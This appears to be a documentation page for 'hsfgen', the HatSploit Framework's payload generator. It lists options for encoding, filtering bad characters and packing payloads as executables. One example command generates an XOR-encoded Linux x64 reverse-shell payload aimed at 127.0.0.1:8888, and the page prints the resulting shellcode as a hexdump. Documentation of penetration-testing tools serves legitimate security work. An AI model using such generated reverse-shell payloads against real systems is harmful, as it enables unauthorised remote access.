---
layout: default
title: Using hsfgen
parent: Getting started
nav_order: 9
---

The HatSploit Framework provides a native command-line payload generator named `hsfgen`. This tool is included by default with all other HatSploit utilities, offering advanced features for payload generation and encoding.

## Command-line options overview

The `hsfgen` utility includes a variety of command-line options that allow you to specify and customize payload generation. The following is a comprehensive overview of the available options:

```
usage: hsfgen [-h] [-p PAYLOAD] [-e ENCODER] [--platform PLATFORM]
              [--arch ARCH] [-f FORMAT] [--formats] [--payloads] [--encoders]
              [--options option1=value1,option2=value2,...] [-i ITERATIONS]
              [-b BADCHARS] [--pack] [--implant] [-a] [-o OUTPUT]

Native HatSploit Framework advanced payload generator.

options:
  -h, --help            Show this help message and exit
  -p PAYLOAD, --payload PAYLOAD
                        HatSploit payload.
  -e ENCODER, --encoder ENCODER
                        HatSploit encoder.
  --platform PLATFORM   Specify the target platform for the payload.
  --arch ARCH           Define the payload architecture.
  -f FORMAT, --format FORMAT
                        Generate the payload in a custom format.
  --formats             List all supported formats.
  --payloads            List all available payloads.
  --encoders            List all available encoders.
  --options option1=value1,option2=value2,...
                        Add options for the encoder or payload.
  -i ITERATIONS, --iterations ITERATIONS
                        Specify the number of encoding iterations.
  -b BADCHARS, --badchars BADCHARS
                        Exclude specific bad characters (e.g. \x00).
  --pack                Package the payload as an executable format.
  --implant             Output only the implant rather than the entire payload.
  -a, --assembly        Display the assembly code for payloads.
  -o OUTPUT, --output OUTPUT
                        Save the generated payload to the specified file.
```

## Payload generation

To generate a payload with `hsfgen`, you must use the `-p` and `-e` options to define the payload and its encoder, respectively. Additionally, you can enhance the payload by applying various options:

* `-i`, `--iterations`: Encode the payload a specified number of times.
* `-b`, `--badchars`: Exclude bad characters during payload generation.
* `--options`: Set specific options within the payload or encoder.
* `--pack`: Package the payload into an executable file format.
* `--implant`: Generate only the implant section of the payload, excluding additional components.
* `-f`, `--format`: Choose a custom executable format for the payload.
* `-o`, `--output`: Save the resulting payload to a specified output file.
* `-c`, `--custom`: Define a custom directory containing HatSploit payloads.

## Listing available formats

The following options allow you to explore the available formats, payloads, and encoders:

* `--formats`: Lists all available executable formats (can be combined with the `--platform` option).
* `--payloads`: Displays a list of all available payloads (can be filtered using the `--platform` and `--arch` options).
* `--encoders`: Lists all available encoders (can be filtered using the `--platform` and `--arch` options).

## Sample usage

To generate a basic `linux/x64/shell_reverse_tcp` payload and encode it with `x64/xor`, you can use the following command:

```shell
hsfgen -p linux/x64/shell_reverse_tcp --options rhost=127.0.0.1,rport=8888 -e x64/xor
```

The output will be similar to:

```entysec
[*] Attempting to generate linux/x64/shell_reverse_tcp...
[i] Payload will be encoded with x64/xor
[*] Writing raw payload (112 bytes)...
00000000  48 31 c9 48 81 e9 b6 ff  ff ff 48 8d 05 ef ff ff |H1.H......H.....|
00000010  ff 48 bb 68 61 74 73 70  6c 36 34 48 31 58 27 48 |.H.hatspl64H1X'H|
00000020  2d f8 ff ff ff e2 f4 02  48 2c ea 1a 6e 69 5e 69 |-.......H,..ni^i|
00000030  3f 7b 76 38 fb 7e 8d 6a  61 56 cb b0 c4 34 5b 39 |?{v8.~.jaV...4[9|
00000040  29 fd 95 1a 7c 6c 5e 42  39 7b 76 1a 6f 68 7c 97 |)...|l^B9{v.oh|.|
00000050  af 1e 52 28 63 33 41 9e  0b 4f 2b e9 24 8d 1b 0a |..R(c3A..O+.$...|
00000060  08 1a 5c 03 04 36 67 20  e8 93 21 27 24 bf d2 67 |.....6g ..!'$..g|
00000070  64                                               |d               |
```

To save the generated payload to a file, you can include the `-o` option in the command.

Additionally, if you want to package the payload into an `ELF` executable format for later execution, you can use the `--pack` option or specify `-f elf` to select the `ELF` format explicitly.
